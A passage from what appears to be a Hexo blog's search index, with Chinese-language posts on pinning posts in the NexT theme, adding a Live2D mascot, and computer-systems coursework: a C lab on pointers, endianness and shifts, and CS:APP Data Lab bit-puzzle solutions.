<span class="comment">// top</span></span><br><span class="line">  posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123;</span><br><span class="line">          <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123;</span><br><span class="line">          <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  sort(posts.data, <span class="function">(<span class="params">a, b</span>) =&gt;</span> (b.sticky || <span class="number">0</span>) - (a.sticky || <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> paginationDir = config.pagination_dir || <span class="string">&#x27;page&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> path = config.index_generator.path || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pagination(path, posts, &#123;</span><br><span class="line">    perPage: config.index_generator.per_page,</span><br><span class="line">    layout: [<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;archive&#x27;</span>],</span><br><span class="line">    format: paginationDir + <span class="string">&#x27;/%d/&#x27;</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      __index: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>即通过比较 <code>top</code> 值来决定文章的排列顺序。</p>
<p>这样添加完成之后，置顶文章并没有明显的标志。此时可以通过开启 <code>custom_file_path</code> 中的 <code>postMeta</code>，并在 <code>/source/_data/</code> 目录下新建 <code>post-meta.njk</code> 文件来进一步操作，但是效果是这样的：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E9%94%99%E8%AF%AFtop.png"></p>
<p>要想把图标放在左侧，只能通过“不推荐”的方法修改主题文件来实现这种效果：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%AD%A3%E7%A1%AEtop.png"></p>
<p>修改 <code>/themes/next/layout/_partials/post/post-meta.njk</code> 文件，在 <code>&lt;div class=&quot;post-meta&quot;&gt;</code> 下添加以下代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% if post.top %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-top-icon&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-thumbtack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">FF0000</span>&gt;</span><span class="symbol">&amp;nbsp;</span>TOP<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>在 NexT 旧版本中，要修改的是 <code>/themes/next/layout/_macro/post.swig</code> 文件。新版本的 NexT 对原 <code>post</code> 文件做了分离。在 Font Awesome 旧版本中，对应的大头针图标名称为 <code>fa fa-thumb-tack</code>，新版改为 <code>fas fa-thumbtack</code>。另外，<code>color</code> 为显示字体的颜色，可以更改为你想要的颜色。后面的提示文字也可以更改为“置顶”等。</p>
<p>完成。</p>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://netcan.github.io/2015/11/22/%E8%A7%A3%E5%86%B3Hexo%E7%BD%AE%E9%A1%B6%E9%97%AE%E9%A2%98/">解决 Hexo 置顶问题 | Netcan on Programming</a></li>
<li><a href="http://wangwlj.com/2018/01/09/blog_pin_post/">Hexo博客彻底解决置顶问题 | wangwlj’s Blog</a></li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>把萌萌哒看板娘抱回你的博客吧！</title>
    <url>/Blog-yuru-chara/</url>
    <content><![CDATA[<p>可爱的看板娘！</p>
<a id="more"></a>

<p>提到看板娘，不得不介绍一种应用于电子游戏的绘图渲染技术——Live2D。</p>
<p>Live2D 由日本 Cybernoids 公司开发，通过一系列的连续图像和人物建模来生成一种类似二维图像的三维模型，使 2D 的素材实现一定程度的 3D 效果，但只能是一定程度 3D，因为 Live2D 人物无法大幅度转身。</p>
<p>很多知名的动漫都是 Live2D 游戏改编的或者反过来的，例如《我的妹妹哪有这么可爱》、《我的朋友很少》、《樱花庄的宠物女孩》等。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E4%BF%BA%E5%A6%B9.jpg"></p>
<p>live2d 的<a href="https://www.live2d.com/zh-CHS/">官方网站</a> 提供了 live2d 开发和编辑软件（如 Live2D Cubism editor 和 Live2D Euclideditor），还有开发使用教程等，对相关制作感兴趣的可以看看。</p>
<p>看板娘是一种职业和习惯称呼，也是 ACG 次文化中的萌属性之一。</p>
<p>看板娘一词源自日语“看板娘（かんばんむすめ）”。其中的“看板”指的是店面招牌，或者是为了宣传、打广告而制作的宣传牌。“看板娘”也就是店面的招牌姑娘，亦即能够提升店面人气和顾客流量的女服务生、女店员等。也就是说，看板娘本身就是一块“活看板”，其本身的魅力就能够起到宣传、拉人气的作用。英语又称之为“Yuru-chara”。</p>
<p>在网页上安装看板娘，大多数都使用的是“hexo-helper-live2d”这一插件。此插件功能较少<del>而且没有可爱的 2233 娘</del>，所以不用此插件。</p>
<p>网页上安装看板娘，主要分为前端和后端两部分。前端主要是一些 JavaScript 文件，后端则是看板娘的模型及调用接口。</p>
<ul>
<li>前端：<a href="https://github.com/SuperPung/super_live2d">https://github.com/SuperPung/super_live2d</a></li>
<li>后端：<a href="https://github.com/SuperPung/super_live2d_api">https://github.com/SuperPung/super_live2d_api</a></li>
</ul>
<p>GitHub 不知道从什么时候开始，默认的分支不再是 <code>master</code> 而是 <code>main</code>，所以 CDN 可能会出现问题，一定要注意。（CDN 的缓存是真的 ex，2.16 改了大半天）</p>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://www.zhangxinxu.com/wordpress/2018/05/live2d-web-webgl-js/">二次元live2d看板娘中的web前端技术 | 张鑫旭-鑫空间-鑫生活</a></li>
<li><a href="https://mzh.moegirl.org.cn/zh-hans/%E7%9C%8B%E6%9D%BF%E5%A8%98">看板娘 - 萌娘百科 万物皆可萌的百科全书</a></li>
<li><a href="https://bluesky01st.js.org/posts/2afd864b.html">Live2D看板娘(bilibili-2233) | BlueSky01st’s Blog</a></li>
<li><a href="https://zhangshuqiao.org/2018-07/%E5%9C%A8%E7%BD%91%E9%A1%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0Live2D%E7%9C%8B%E6%9D%BF%E5%A8%98/">在网页中添加 Live2D 看板娘 | 米米的博客</a></li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>Blog Config</tag>
      </tags>
  </entry>
  <entry>
    <title>指针、字节序、移位、数组 reverse</title>
    <url>/Computer-Systems-Experiment-2/</url>
    <content><![CDATA[<p>Computer Systems Experiment #2</p>
<a id="more"></a>

<blockquote>
<ul>
<li>完善附件的代码：补齐缺失的代码完成以下功能</li>
<li>根据代码的输出结果，判定一下自己的计算机的CPU是大端序还是小端序，说明理由。</li>
<li>完善checkShift()函数中输出结果的代码，理解Logic/Arithmetic 移位操作, 理解超出变量类型bit长度时编译器和CPU的不同行为。总结对常数和变量进行移位的结果。</li>
<li>学习使用inpswap函数，对inplaceReverseArray()函数内容进行完善，检查table1和table2的输出结果是否满足要求。</li>
<li>如果inplaceReverseArray的结果有问题，如何修改才能正确完成数组的反序。</li>
<li>写明自己用编译器版本、操作系统名及版本。</li>
<li>作业提交：最终的源代码，在代码的开头用注释的方式写出以上4项的结果报告。</li>
</ul>
</blockquote>
<ol>
<li>The CPU of my computer is little endian, because the output is<br> localVar @ 0061FECC:d5<br> localVar @ 0061FECD:dd<br> localVar @ 0061FECE:00<br> localVar @ 0061FECF:00.<br> The least significant byte d5 comes first, and the most one 00 is stored in the end.</li>
<li>When the operation is beyond the length of signed varible type,<br>the constant will be shifted by logic by compiler, while the varible will be shifted by arithmetic by CPU.</li>
<li>In the reverse_array function, the judging condition of FOR-loop shouldnot be first &lt;= last.<br>Because when they are equal, the xor result will be 0, thus making the middle element of the array be 0.</li>
<li>Compiler: gcc version 8.1.0 (i686-win32-dwarf-rev0, Built by MinGW-W64 project)<br> OS: Windows 10 Professional, version 1909 (updated Jan 2020) (x86)</li>
</ol>
<p>My code is as follows:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//functions prototype declearation</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkShift</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inplaceReverseArray</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_array</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">size_t</span> cnt)</span></span>;</span><br><span class="line"><span class="keyword">int</span> gVar;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x1 = <span class="number">23</span>, y1 = <span class="number">0xAA</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//pinter test</span></span><br><span class="line">        <span class="keyword">int</span> B = <span class="number">-12345</span>;</span><br><span class="line">        <span class="keyword">int</span> *p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        p = &amp;B; <span class="comment">//pass the address of B to p</span></span><br><span class="line">        *p = <span class="number">56789</span>;</span><br><span class="line">        <span class="keyword">char</span> *pc;</span><br><span class="line">        pc = (<span class="keyword">char</span> *)&amp;B;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//check pointer addressed value</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d = %8.8x\n&quot;</span>, p[<span class="number">0</span>], p[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d = %x\n&quot;</span>, (<span class="keyword">char</span>)pc[<span class="number">0</span>], pc[<span class="number">0</span>] &amp; <span class="number">0xFF</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//check local address &amp; endian</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(B); i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;localVar @ %p:%2.2x\n&quot;</span>, pc + i, (<span class="keyword">unsigned</span> <span class="keyword">char</span>)*(pc + i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//check global address &amp; endian</span></span><br><span class="line">        pc = (<span class="keyword">char</span> *)&amp;gVar;</span><br><span class="line">        gVar = <span class="number">0x12345678</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(B); i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;gVar @ %p:%2.2x\n&quot;</span>, pc + i, (<span class="keyword">unsigned</span> <span class="keyword">char</span>)*(pc + i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//check code address</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;main @ %p\n&quot;</span>, main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//check lib code address</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//check inplace swap</span></span><br><span class="line">        x1 = <span class="number">0x23</span>;</span><br><span class="line">        y1 = <span class="number">0xAA</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;before swap: %x,%x\n&quot;</span>, x1, y1);</span><br><span class="line">        inpswap(&amp;x1, &amp;y1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;after swap: %x,%x\n&quot;</span>, x1, y1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,%d\n&quot;</span>, x1, y1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//check Logical/arithmetic shift</span></span><br><span class="line">        checkShift();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//use inplace swap reverse array element</span></span><br><span class="line">        inplaceReverseArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//check shift bits&gt;=variable size</span></span><br><span class="line"><span class="comment">//learn shift</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkShift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> uBig = <span class="number">0x00123456</span>;</span><br><span class="line">        <span class="keyword">int</span> varBig = (<span class="number">0x00123456</span> &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//signed constant shift by compiler</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;signed constant shift by compiler\n&quot;</span>);</span><br><span class="line">        varBig = (<span class="number">0x87123456</span> &gt;&gt; <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87123456 &gt;&gt; 32: %d\n&quot;</span>, varBig);</span><br><span class="line"></span><br><span class="line">        varBig = (<span class="number">0x87123456</span> &gt;&gt; <span class="number">40</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87123456 &gt;&gt; 40: %d\n&quot;</span>, varBig);</span><br><span class="line"></span><br><span class="line">        varBig = (<span class="number">0x87123456</span> &lt;&lt; <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87123456 &lt;&lt; 32: %d\n&quot;</span>, varBig);</span><br><span class="line"></span><br><span class="line">        varBig = (<span class="number">0x87123456</span> &lt;&lt; <span class="number">40</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87123456 &lt;&lt; 40: %d\n&quot;</span>, varBig);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//signed varable shift by CPU</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;signed varible shift by CPU\n&quot;</span>);</span><br><span class="line">        varBig = (<span class="number">0x87123456</span>);</span><br><span class="line">        varBig &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87123456 &lt;&lt; 32: %d\n&quot;</span>, varBig);</span><br><span class="line"></span><br><span class="line">        varBig = (<span class="number">0x87123456</span>);</span><br><span class="line">        varBig &lt;&lt;= <span class="number">40</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87123456 &lt;&lt; 40: %d\n&quot;</span>, varBig);</span><br><span class="line"></span><br><span class="line">        varBig = (<span class="number">0x87123456</span>);</span><br><span class="line">        varBig &gt;&gt;= <span class="number">32</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87123456 &gt;&gt; 32: %d\n&quot;</span>, varBig);</span><br><span class="line"></span><br><span class="line">        varBig = (<span class="number">0x87123456</span>);</span><br><span class="line">        varBig &gt;&gt;= <span class="number">40</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87123456 &gt;&gt; 40: %d\n&quot;</span>, varBig);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//unsigned shift by variable</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;unsigned shift by variable\n&quot;</span>);</span><br><span class="line">        uBig = <span class="number">0x87654321</span>;</span><br><span class="line">        uBig &lt;&lt;= <span class="number">40</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87654321 &lt;&lt; 40: %d\n&quot;</span>, uBig);</span><br><span class="line"></span><br><span class="line">        uBig = <span class="number">0x87654321</span>;</span><br><span class="line">        uBig &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87654321 &lt;&lt; 32: %d\n&quot;</span>, uBig);</span><br><span class="line"></span><br><span class="line">        uBig = <span class="number">0x87654321</span>;</span><br><span class="line">        uBig &gt;&gt;= <span class="number">40</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87654321 &gt;&gt; 40: %d\n&quot;</span>, uBig);</span><br><span class="line"></span><br><span class="line">        uBig = <span class="number">0x87654321</span>;</span><br><span class="line">        uBig &gt;&gt;= <span class="number">32</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x87654321 &gt;&gt; 32: %d\n&quot;</span>, uBig);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> varBig2 = (<span class="number">0x123456</span> &lt;&lt; <span class="number">40</span>); <span class="comment">//compiler =&gt;0</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, varBig);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//you can not use other array as intermidiate buffer</span></span><br><span class="line"><span class="comment">//参考 中文ebook  p38练习题2.11，完善代码，找出BUG</span></span><br><span class="line"><span class="comment">//ref  English Book p91 Practice Problem 2.11 complete the code &amp; find bugs</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inplaceReverseArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> table1[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> table2[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// table1</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(table1) / <span class="keyword">sizeof</span>(<span class="keyword">int</span>); i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, table1[i]);</span><br><span class="line"></span><br><span class="line">        reverse_array(table1, <span class="keyword">sizeof</span>(table1) / <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(table1) / <span class="keyword">sizeof</span>(<span class="keyword">int</span>); i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, table1[i]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// table2</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(table2) / <span class="keyword">sizeof</span>(<span class="keyword">int</span>); i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, table2[i]);</span><br><span class="line"></span><br><span class="line">        reverse_array(table2, <span class="keyword">sizeof</span>(table2) / <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(table2) / <span class="keyword">sizeof</span>(<span class="keyword">int</span>); i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, table2[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//reverseArray without buffer</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_array</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">size_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> first, last;</span><br><span class="line">        <span class="keyword">for</span> (first = <span class="number">0</span>, last = cnt - <span class="number">1</span>; first &lt; last; first++, last--)</span><br><span class="line">        &#123;</span><br><span class="line">                inpswap(&amp;a[first], &amp;a[last]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//swap without buffer</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inpswap</span><span class="params">(<span class="keyword">int</span> *x, <span class="keyword">int</span> *y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        *x = *x ^ *y;</span><br><span class="line">        *y = *x ^ *y;</span><br><span class="line">        *x = *x ^ *y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If you have found my mistake, please tell me. Thank you.</p>
]]></content>
      <tags>
        <tag>Computer Systems</tag>
        <tag>Experiments</tag>
      </tags>
  </entry>
  <entry>
    <title>简单又复杂的位级运算（未完待续）</title>
    <url>/Data-Lab-1/</url>
    <content><![CDATA[<p>Data Lab: Manipulating Bits #1 - 对于实验一（Data Lab）的一些想法（上）。</p>
<a id="more"></a>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>这个实验要求学生实现简单的逻辑和算术运算函数，但是只能使用一个非常有限的C语言子集。比如，只能用位级操作来计算一个数字的绝对值。这个实验可帮助学生了解 C语言数据类型的位级表示，以及数据操作的位级行为。</p>
</blockquote>
<h1 id="Puzzle-1-isAsciiDigit"><a href="#Puzzle-1-isAsciiDigit" class="headerlink" title="Puzzle 1 - isAsciiDigit"></a>Puzzle 1 - isAsciiDigit</h1><blockquote>
<p>isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters ‘0’ to ‘9’)<br>Examples: isAsciiDigit(0x35) = 1<br>          isAsciiDigit(0x3a) = 0<br>          isAsciiDigit(0x05) = 0<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 15<br>Rating: 3</p>
</blockquote>
<p>本题应首先判断参数<code>x</code>是否介于<code>0x30</code>与<code>0x39</code>之间，但实验要求不可使用<code>if</code>等语句，应该考虑位运算的方法。</p>
<p>我们知道，参数<code>x</code>介于<code>0x30</code>与<code>0x39</code>之间，等价于<code>x - 0x30</code>的结果为非负，且<code>x - 0x3a</code>的结果为负。从而可以利用正数与负数的符号位的区别进行进一步运算。</p>
<p>同时注意实验要求不可使用减法运算符，可以用“取反加一”的方法代替之。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lowCmp = x + ~<span class="number">0x30</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> highCmp = x + ~<span class="number">0x3a</span> + <span class="number">1</span>;</span><br><span class="line">    lowCmp &gt;&gt;= <span class="number">31</span>;</span><br><span class="line">    highCmp &gt;&gt;= <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> ((!lowCmp) &amp; !!(highCmp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-2-anyEvenBit"><a href="#Puzzle-2-anyEvenBit" class="headerlink" title="Puzzle 2 - anyEvenBit"></a>Puzzle 2 - anyEvenBit</h1><blockquote>
<p>anyEvenBit - return 1 if any even-numbered bit in word set to 1<br>Examples: anyEvenBit(0xA) = 0, anyEvenBit(0xE) = 1<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 12<br>Rating: 2</p>
</blockquote>
<p>本题需要对参数<code>x</code>的偶数位进行判断，故可以利用偶数位全为1、奇数位全为0的“模版”辅助判断。</p>
<p>注意实验要求使用的常数应保证在0～255之间，故可以多次左移来将模版扩大为需要的长度。</p>
<p>同时注意要求中的<code>any even-numbered bit in word set to 1</code>意为只要存在某一偶数位为1即可，并非要求所有偶数位全部为1。所以其反义为“所有偶数位全为0”。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">anyEvenBit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0x55</span>;</span><br><span class="line">    <span class="keyword">int</span> b = (a &lt;&lt; <span class="number">8</span>) + a;</span><br><span class="line">    <span class="keyword">int</span> c = (b &lt;&lt; <span class="number">8</span>) + a;</span><br><span class="line">    <span class="keyword">int</span> d = (c &lt;&lt; <span class="number">8</span>) + a;</span><br><span class="line">    <span class="keyword">return</span> !!(x &amp; d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-3-copyLSB"><a href="#Puzzle-3-copyLSB" class="headerlink" title="Puzzle 3 - copyLSB"></a>Puzzle 3 - copyLSB</h1><blockquote>
<p>copyLSB - set all bits of result to least significant bit of x<br>Examples: copyLSB(5) = 0xFFFFFFFF, copyLSB(6) = 0x00000000<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 5<br>Rating: 2</p>
</blockquote>
<p>本题可以利用算术右移时高位填充与符号位有关的特点来解。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copyLSB</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt;&lt; <span class="number">31</span> &gt;&gt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-4-leastBitPos"><a href="#Puzzle-4-leastBitPos" class="headerlink" title="Puzzle 4 - leastBitPos"></a>Puzzle 4 - leastBitPos</h1><blockquote>
<p>leastBitPos - return a mask that marks the position of the least significant 1 bit. If x == 0, return 0<br>Example: leastBitPos(0x60) = 0x20<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 6<br>Rating: 2</p>
</blockquote>
<p>一个数的编码中，“1”所在的位权最小的位的低位全为0，即为“…100…0”的形式（记作<code>1</code>）。按位取反，变为“…011…1”的形式（记作<code>2</code>），再加1得到“…100…0”的形式（记作<code>3</code>）。其中形式<code>3</code>中的“1”的高位与形式<code>2</code>的对应位相同，即与形式<code>1</code>（原数）相反。</p>
<p>形式<code>3</code>即原数的相反数，故可以将参数<code>x</code>与其相反数按位与，较高位均变为0，只保留了“1”所在位权最小位。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leastBitPos</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> _x = ~x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x &amp; _x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-5-divpwr2"><a href="#Puzzle-5-divpwr2" class="headerlink" title="Puzzle 5 - divpwr2"></a>Puzzle 5 - divpwr2</h1><blockquote>
<p>divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30<br>Round toward zero<br>Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 15<br>Rating: 2</p>
</blockquote>
<p>首先可能想到直接对参数<code>x</code>进行右移，但注意右移为算术右移，负数的右移可能会得到错误的结果。</p>
<p>负数除以$2^n$，可以看作它的相反数除以$2^n$后再取相反数。取相反数即“取反加一”，也就是说，当参数<code>x &lt; 0</code>时，<code>x / </code>$2^n$ 与<code>~((~x + 1) &gt;&gt; n) + 1</code>等价。基于此，下面讨论一下此表达式具体的算法。</p>
<p>前提<code>x &lt; 0</code>。首先计算<code>(~x + 1) &gt;&gt; n</code>，不难看出结果与<code>~x</code>的低<code>n</code>位有密切联系，而<code>~x</code>由<code>x</code>按位取反而来，有以下两种情况：</p>
<ul>
